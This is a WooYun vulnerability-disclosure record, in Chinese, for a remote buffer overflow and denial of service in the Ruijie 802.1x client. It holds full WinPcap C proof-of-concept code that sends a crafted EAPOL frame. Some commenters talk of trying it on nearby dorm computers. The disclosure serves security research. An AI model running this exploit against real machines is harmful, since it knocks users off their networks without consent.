{"id": 12342, "wybug_id": "wooyun-2013-019896", "wybug_title": "锐捷 802.1x客户端远程缓冲区溢出漏洞", "wybug_corp": "锐捷", "wybug_author": "cssembly", "wybug_date": "2013-03-11 11:22", "wybug_open_date": "2013-06-09 11:22", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端安全", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 锐捷802.1x客户端存在远程缓冲区溢出漏洞，当发送恶意的数据包到客户端，会造成远程缓冲区溢出导致拒绝服务 详细说明：  通过查看IDA反汇编结果，可以看到sub_465920函数中\n\nmemcpy拷贝数据的长度是可控的，由程序接收到的数据包中的第26,27字节决定，而程序并未进行有效的校验，导致缓冲区溢出，造成拒绝服务   漏洞证明：  poc代码：\n#include <pcap.h>#pragma comment( lib , \"wpcap.lib\" )int _tmain(int argc, _TCHAR* argv[]){\tpcap_t *fp;\tchar errbuf[PCAP_ERRBUF_SIZE];\tu_char packet[3000];\tpcap_if_t *alldevs;\t/* Check the validity of the command line */\tif(pcap_findalldevs(&alldevs, errbuf) == -1)\t{\t\tfprintf(stderr,\"Error in pcap_findalldevs: %s\\n\", errbuf);\t\texit(1);\t}\tpcap_if_t *d;\tint i = 0;\t/* Print the list */\tfor(d=alldevs; d; d=d->next)\t{\t\tprintf(\"%d. %s\", ++i, d->name);\t\tif (d->description)\t\t\tprintf(\" (%s)\\n\", d->description);\t\telse\t\t\tprintf(\" (No description available)\\n\");\t}\t/* 选择相应网卡*/\tif ((fp = pcap_open_live(alldevs->name,\t\t// name of the device\t\t65536,\t\t\t// portion of the packet to capture. It doesn't matter in this case \t\t1,\t\t\t\t// promiscuous mode (nonzero means promiscuous)\t\t1000,\t\t\t// read timeout\t\terrbuf\t\t\t// error buffer\t\t)) == NULL)\t{\t\tfprintf(stderr,\"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", argv[1]);\t\treturn 2;\t}\tmemset( packet , 0 , 1000 );\t\t/* 目标机器mac地址 */\tpacket[0]= 0x00;\tpacket[1]= 0x0C;\tpacket[2]= 0x29;\tpacket[3]= 0x0F;\tpacket[4]= 0x63;\tpacket[5]= 0xDD;\t/* set mac source to 2:2:2:2:2:2 */\tpacket[6]= 2;\tpacket[7]= 2;\tpacket[8]= 2;\tpacket[9]= 2;\tpacket[10]= 2;\tpacket[11]= 2;\t/* 协议头 */\tpacket[12] = 0x88;\tpacket[13] = 0x8e;\tpacket[14] = 0x01;\tpacket[15] = 0x00;\tpacket[16] = 0xFF;//>4\tpacket[17] = 0xFF;//>4\tpacket[18] = 0x03;\t\tpacket[22] = 0x00;//\tpacket[23] = 0x00;//\tpacket[24] = 0x13;//\tpacket[25] = 0x11;//\tpacket[26] = 0xEE;//\tpacket[27] = 0xFF;//\t/* Send down the packet */\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tSleep( 100 );\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t\t\t\t\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpcap_close(fp);\t\treturn 0;}\n运行程序\n\n输入用户名和密码点击连接\n\n运行poc代码\n\n客户端程序溢出，并退出   修复方案：     版权声明：转载请注明来源 cssembly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-03-11 11:37 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  CA-2002-06 radius服务器那个洞子? 现在多数设备厂商支持1x中继的路由交换设备 或者AAA服务器本身都是较老的radius版本修改后商业化的 并没有跟着国际的版本走 导致这中间的漏洞无从处理。    \n     2013-03-11 11:49 |    \t\tcssembly \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:23        | 天资不足，勤奋有余！)\t\t \n  @none 不是，我没看过那个洞，自己挖的，不清楚    \n     2013-03-11 12:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @none 不过你说的是个问题啊    \n     2013-04-28 13:54 |    \t\t射不出来 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 我是来混的...)\t\t \n  这个不是该公开了么？    \n     2013-06-09 12:25 |    \t\t锁相环 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | NULL)\t\t \n  略神奇的样子，晚上对隔壁寝室的机器试试～    \n     2013-06-09 15:07 |    \t\tcssembly \t\t\t( 普通白帽子  |\t\t\t        Rank:202 漏洞数:23        | 天资不足，勤奋有余！)\t\t \n  @锁相环 这个是需要一定的条件的，估计很难    \n     2013-06-12 19:12 |    \t\twarrioj4 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 专注工具30年)\t\t \n  @cssembly 貌似锐捷的交换机对以太网帧有过滤 我们学校就是用锐捷的 寝室的2层交换机接在学校的三层交换机上 把目的MAC换成隔壁寝室电脑的MAC 隔壁寝室的电脑并没有收到这个以太网帧 我们是同一网段的   还有 能否请教一下 大牛 如何入门成为一名二进制白帽？    \n     2013-06-12 19:15 |    \t\twarrioj4 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 专注工具30年)\t\t \n  @cssembly 这个应该也只能针对同一网段进行攻击 非同一网段需要感染其它网段的机器吧    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}